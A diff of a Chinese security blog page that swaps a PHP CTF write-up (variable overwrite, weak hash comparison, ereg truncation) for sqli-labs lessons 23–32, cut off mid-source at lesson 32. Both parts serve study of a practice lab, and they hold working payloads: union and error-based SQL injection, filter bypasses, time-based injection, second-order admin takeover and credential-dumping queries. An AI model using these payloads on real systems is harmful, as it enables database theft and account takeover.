@@ -6,27 +6,43 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断） | Wh1te</title>
+  <title>sqli-labs学习(lesson23-lesson40) | Wh1te</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="extract变量覆盖题目链接：47.106.142.99:8001进入后可看到如下信息1234567891011121314151617181920 &amp;lt;?php error_reporting(0);include &amp;quot;flag.php&amp;quot;;$filename=__FILE__;$NYSEC=&amp;quot;666&amp;quot;;extract($_GET);if(isset($">
-<meta name="keywords" content="CTF">
+  <meta name="description" content="lesson23 源码sql语句123456$reg = &amp;quot;/#/&amp;quot;;$reg1 = &amp;quot;/--/&amp;quot;;$replace = &amp;quot;&amp;quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=&amp;quot;SELECT * FROM">
+<meta name="keywords" content="学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）">
-<meta property="og:url" content="http://yoursite.com/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/index.html">
+<meta property="og:title" content="sqli-labs学习(lesson23-lesson40)">
+<meta property="og:url" content="http://yoursite.com/2019/01/27/sqli-labs(lesson23-lesson40)/index.html">
 <meta property="og:site_name" content="Wh1te">
-<meta property="og:description" content="extract变量覆盖题目链接：47.106.142.99:8001进入后可看到如下信息1234567891011121314151617181920 &amp;lt;?php error_reporting(0);include &amp;quot;flag.php&amp;quot;;$filename=__FILE__;$NYSEC=&amp;quot;666&amp;quot;;extract($_GET);if(isset($">
+<meta property="og:description" content="lesson23 源码sql语句123456$reg = &amp;quot;/#/&amp;quot;;$reg1 = &amp;quot;/--/&amp;quot;;$replace = &amp;quot;&amp;quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=&amp;quot;SELECT * FROM">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-9576e94c3fe329a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-089a87776a6e2c63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-7612621f1953bd14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-3c53e1b7f493b813.gif?imageMogr2/auto-orient/strip">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-3e1e91bac41a3bc9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-e0574dc8381a4b69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-15T17:01:51.022Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-091fede454416109.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-4d92c1adf34364b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-73a72ac603d2923b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-c2e16d7df07563f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-565e8b07b910d991.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-1a64faefa238b51e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-579fe2a0691f915d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-c2d0268b0298b545.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-412edabf11940142.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-ec2137260476ba0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-bae89b148875323c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-333f1dc08b356457.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-12016283542e5544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-21b9806b63fdc837.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-5744c60d0e7c087c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-97207a306e159650.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-d66e9e268ef645f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-0b5e111766f08e15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-2933a33c680b03a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-e1a4f500a1e4b2be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-f0e97a59fe091cee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-f01687448ca91e1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-26T17:25:13.393Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）">
-<meta name="twitter:description" content="extract变量覆盖题目链接：47.106.142.99:8001进入后可看到如下信息1234567891011121314151617181920 &amp;lt;?php error_reporting(0);include &amp;quot;flag.php&amp;quot;;$filename=__FILE__;$NYSEC=&amp;quot;666&amp;quot;;extract($_GET);if(isset($">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/15184404-9576e94c3fe329a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="sqli-labs学习(lesson23-lesson40)">
+<meta name="twitter:description" content="lesson23 源码sql语句123456$reg = &amp;quot;/#/&amp;quot;;$reg1 = &amp;quot;/--/&amp;quot;;$replace = &amp;quot;&amp;quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=&amp;quot;SELECT * FROM">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/15184404-091fede454416109.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
   
     <link rel="alternative" href="/atom.xml" title="Wh1te" type="application/atom+xml">
   
@@ -176,48 +192,199 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-sqli-labs(lesson23-lesson40)" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）
+      sqli-labs学习(lesson23-lesson40)
     </h1>
   
 
         
-        <a href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:52:25.707Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
+        <a href="/2019/01/27/sqli-labs(lesson23-lesson40)/" class="archive-article-date">
+  	<time datetime="2019-01-26T17:24:03.182Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><p>题目链接：47.106.142.99:8001<br>进入后可看到如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$filename=__FILE__;</span><br><span class="line">$NYSEC=&quot;666&quot;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($NYSEC))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($filename));</span><br><span class="line">    if($NYSEC==$content)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        echo &quot;sorry!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; sorry!!</span><br></pre></td></tr></table></figure></p>
-<a id="more"></a>
-<p>代码大意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一个名叫filename的变量为__FILE__</span><br><span class="line">一个名叫NYSEC的变量为&quot;666&quot;</span><br><span class="line">将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)</span><br><span class="line">如果存在一个名叫NYSEC的字符串</span><br><span class="line">将filename变量的值赋给名为content变量 </span><br><span class="line">如果变量NYSEC和变量content的值相同</span><br><span class="line">就输出flag的值</span><br><span class="line">否则</span><br><span class="line">对__FILE__文件进行PHP语法高亮显示，语法通过HTML标签进行高亮</span><br><span class="line">输出sorry！！</span><br></pre></td></tr></table></figure></p>
-<p>因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?NYSEC=&amp;filename=<br>也就是利用新传入的值为空的filename替换原有的filename的值。构造空等于空，成功输出flag的值<br><img src="https://upload-images.jianshu.io/upload_images/15184404-9576e94c3fe329a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>Flag：NYSEC{PHP_is_the_best_language}</p>
-<h1 id="php弱类型比较"><a href="#php弱类型比较" class="headerlink" title="php弱类型比较"></a>php弱类型比较</h1><p>题目链接：47.106.142.99:8007<br>进入后可看到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;NYSEC&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    echo sha1($_GET[&apos;NYSEC&apos;]).&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    echo sha1($_GET[&apos;password&apos;]).&quot;&lt;/br&gt;&quot;;</span><br><span class="line">      </span><br><span class="line">    if ($_GET[&apos;NYSEC&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">        echo &apos;&lt;p&gt;Your password can not be your NYSEC!&lt;/p&gt;&apos;;</span><br><span class="line">         </span><br><span class="line">    else if (md5($_GET[&apos;NYSEC&apos;]) == md5($_GET[&apos;password&apos;]))</span><br><span class="line">      die(&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Login first!</span><br></pre></td></tr></table></figure></p>
+        <h1 id="lesson23"><a href="#lesson23" class="headerlink" title="lesson23"></a>lesson23</h1><ul>
+<li>源码sql语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/#/&quot;;</span><br><span class="line">$reg1 = &quot;/--/&quot;;</span><br><span class="line">$replace = &quot;&quot;;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>此处在获取id参数时对注释符号#和- -进行了过滤，没办法，只好闭合绕过</p>
 <blockquote>
-<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<p>?id=-1’union select 1,@@datadir,’5555</p>
 </blockquote>
-<p>乍一看我当时还以为是MD5绕过，，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。<br>于是乎我进行了错误的尝试Payload：?NYSEC=QNKXDZO&amp;password=240610708<br><img src="https://upload-images.jianshu.io/upload_images/15184404-089a87776a6e2c63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>绕过成功，但是得到了一段加密文字，但是并没有flag<br>在师傅的提示下，我意识到可能可以利用sha1()函数的漏洞进行绕过</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-091fede454416109.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>此处可以报错注入，延时注入</p>
+<ul>
+<li>利用extractvalue()进行报错注入<blockquote>
+<p>?id=1’or extractvalue(1,concat(0x7e,database())) or ‘1’=’1</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-4d92c1adf34364b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h1 id="lesson24"><a href="#lesson24" class="headerlink" title="lesson24"></a>lesson24</h1><p>这关是二次排序注入</p>
+<h5 id="二次排序注入"><a href="#二次排序注入" class="headerlink" title="二次排序注入"></a>二次排序注入</h5><p>二次排序注入也称为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。(详细解释晚会发)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;	</span><br><span class="line">	$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;</span><br></pre></td></tr></table></figure></p>
+<p>注册时过滤也存在问题，假设题目中存在admin账号，通过注册admin’#使得Sql语句变为</p>
 <blockquote>
-<p>sha1() 函数计算字符串的 SHA-1 散列。<br>sha1() 函数使用美国 Secure Hash 算法 1。<br>来自 RFC 3174 的解释 - 美国 Secure Hash 算法 1：SHA-1 产生一个名为报文摘要的 160 位的输出。报文摘要可以被输入到一个可生成或验证报文签名的签名算法。对报文摘要进行签名，而不是对报文进行签名，这样可以提高进程效率，因为报文摘要的大小通常比报文要小很多。数字签名的验证者必须像数字签名的创建者一样，使用相同的散列算法。</p>
+<p>UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’ ，</p>
 </blockquote>
-<p>由于sha1()函数无法处理数组类型,将会报错并返回NULL，使得else if条件语句成立输出flag<br>构造Payload：?NYSEC[]=margin&amp;password[]</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/15184404-7612621f1953bd14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>Flag: NYSEC{356a192b7913b04c54574dc28d46e6395428ab}</p>
-<h1 id="ereg截断"><a href="#ereg截断" class="headerlink" title="ereg截断"></a>ereg截断</h1><p>题目链接：47.106.142.99:8004<br>进入后看到如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">     </span><br><span class="line">    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">      else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">    &#123;    </span><br><span class="line">    </span><br><span class="line">        if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;Flag: &apos; . $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>很显然，从题目和代码可以看出，考查的是ereg截断绕过<br><img src="https://upload-images.jianshu.io/upload_images/15184404-3c53e1b7f493b813.gif?imageMogr2/auto-orient/strip" alt=""></p>
-<p>利用ereg读到%00的时候，就截止了这个漏洞，可以找到flag。<br>即字符串里面包括%00，又因为</p>
+<p>由于#注释掉了后面的语句，这也就相当于我们获得了admin账号</p>
+<ul>
+<li>注册一个名为admin’密码为123的账号</li>
+<li>原始数据库<br><img src="https://upload-images.jianshu.io/upload_images/15184404-73a72ac603d2923b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>注册成功<br><img src="https://upload-images.jianshu.io/upload_images/15184404-c2e16d7df07563f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>可以看到，当前admin账号密码为admin，接下来登陆admin’#，修改密码为666，再查看数据库<br><img src="https://upload-images.jianshu.io/upload_images/15184404-565e8b07b910d991.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>admin密码被成功修改，利用此方法我们拿到了管理员账号，如果是真实的网站发生这种情况，结局就不用多说了吧<h1 id="lesson25"><a href="#lesson25" class="headerlink" title="lesson25"></a>lesson25</h1>这一关是or和and过滤</li>
+<li>or报错注入<blockquote>
+<p>?id=1’|| extractvalue(1,concat(0x7e,database()))–+</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-1a64faefa238b51e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>and<blockquote>
+<p>?id=2&amp;&amp;1=1–+</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-579fe2a0691f915d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h5 id="lesson25-a"><a href="#lesson25-a" class="headerlink" title="lesson25-a"></a>lesson25-a</h5><blockquote>
+<p>?id=2 aandnd 1=1%23</p>
+</blockquote>
+<h1 id="lesson26"><a href="#lesson26" class="headerlink" title="lesson26"></a>lesson26</h1><p><img src="https://upload-images.jianshu.io/upload_images/15184404-c2d0268b0298b545.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>需要绕过对空格的过滤<br>对于空格的构建方法：</p>
+<ol>
+<li>%09 TAB键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return功能</li>
+<li>%0b TAB键（垂直）</li>
+<li>%a0 空格<br>源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>可以构造如下语句</p>
 <blockquote>
-<p>else if (strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999)<br>{<br>if (strpos ($_GET[‘password’], ‘<em>-</em>‘) !== FALSE)</p>
+<p>?id=100’union%0Bselect%A01,2,3)||%271</p>
 </blockquote>
-<p>所以字符串需要长度小于8但要大于9999999且还要有-<br>所以只需在地址栏构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?password=1e8%00*-*</span><br></pre></td></tr></table></figure></p>
-<p>即可得出flag<br><img src="https://upload-images.jianshu.io/upload_images/15184404-3e1e91bac41a3bc9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br> Flag: NYSEC{4496a4721ecb4cdce12b2b73e7a635c4}<br><img src="https://upload-images.jianshu.io/upload_images/15184404-e0574dc8381a4b69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-412edabf11940142.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h5 id="注意：此方法在Windows下不适用（反正我win10不行，用的是kali-Linux才行）据说是因为apache的解析的问题"><a href="#注意：此方法在Windows下不适用（反正我win10不行，用的是kali-Linux才行）据说是因为apache的解析的问题" class="headerlink" title="注意：此方法在Windows下不适用（反正我win10不行，用的是kali Linux才行）据说是因为apache的解析的问题"></a>注意：此方法在Windows下不适用（反正我win10不行，用的是kali Linux才行）据说是因为apache的解析的问题</h5><ul>
+<li>Windows环境下解决思路：<br>延迟注入方法<blockquote>
+<p>?id=1’ %26%26sleep(ascii(mid(database(),1,1))=116)%26%26’1’=’1</p>
+</blockquote>
+</li>
+</ul>
+<p>利用休眠时间判断</p>
+<h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>屏蔽了26的字符，还给$id加了一对括号</p>
+<h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><ul>
+<li>方法一：<br>与上一关类似，将union和select变为大小写混合即可<blockquote>
+<p>?id=100’unIon%a0SelEcT%a01,database(),3||’1</p>
+</blockquote>
+<h5 id="a-1"><a href="#a-1" class="headerlink" title="-a"></a>-a</h5><blockquote>
+<p>?id=100”%a0UnIon%a0SElecT%a01,user(),”3</p>
+</blockquote>
+</li>
+<li>方法二：双写大小写union和select<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; UNionUNION%0ASeLectselect%0A1,database(),&apos;1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; UNionUNION%0ASeLectselect%0A1,(seLect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&apos;security&apos;),&apos;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%0AUNionUNION%0ASeLectselect%0A1,(SeLectselect%0Agroup_concat(username,password)%0Afrom%0Ausers),&apos;1</span><br></pre></td></tr></table></figure>
+<h1 id="lesson28"><a href="#lesson28" class="headerlink" title="lesson28"></a>lesson28</h1><p>与上关没什么区别</p>
+<blockquote>
+<p>?id=100’)union%a0select(1),(user()),(3)||(‘1</p>
+</blockquote>
+<h5 id="a-2"><a href="#a-2" class="headerlink" title="-a"></a>-a</h5><blockquote>
+<p>?id=100%27)unIon%0bsElect%0b1,@@basedir,3||(%27</p>
+</blockquote>
+<ul>
+<li>方法二：<blockquote>
+<p>?id=0’ UNionUNION%0ASeLectselect%0A1,database(),’1</p>
+</blockquote>
+<h1 id="lesson29"><a href="#lesson29" class="headerlink" title="lesson29"></a>lesson29</h1>单引号注入<blockquote>
+<p>?id=-2’union select 1,user(),3–+</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-ec2137260476ba0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h1 id="lesson30"><a href="#lesson30" class="headerlink" title="lesson30"></a>lesson30</h1><p>双引号注入</p>
+<blockquote>
+<p>?id=-2”union select 1,user(),3–+</p>
+</blockquote>
+<h1 id="lesson31"><a href="#lesson31" class="headerlink" title="lesson31"></a>lesson31</h1><p>在上题基础上加个)</p>
+<blockquote>
+<p>?id=-2”)union select 1,user(),3–+</p>
+</blockquote>
+<h1 id="lesson32"><a href="#lesson32" class="headerlink" title="lesson32"></a>lesson32</h1><p>上源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\&apos;) .&apos;/&apos;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&apos;/\&apos;/i&apos;, &apos;\\\&apos;&apos;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&apos;/\&quot;/&apos;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[&apos;id&apos;]);</span><br><span class="line">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity 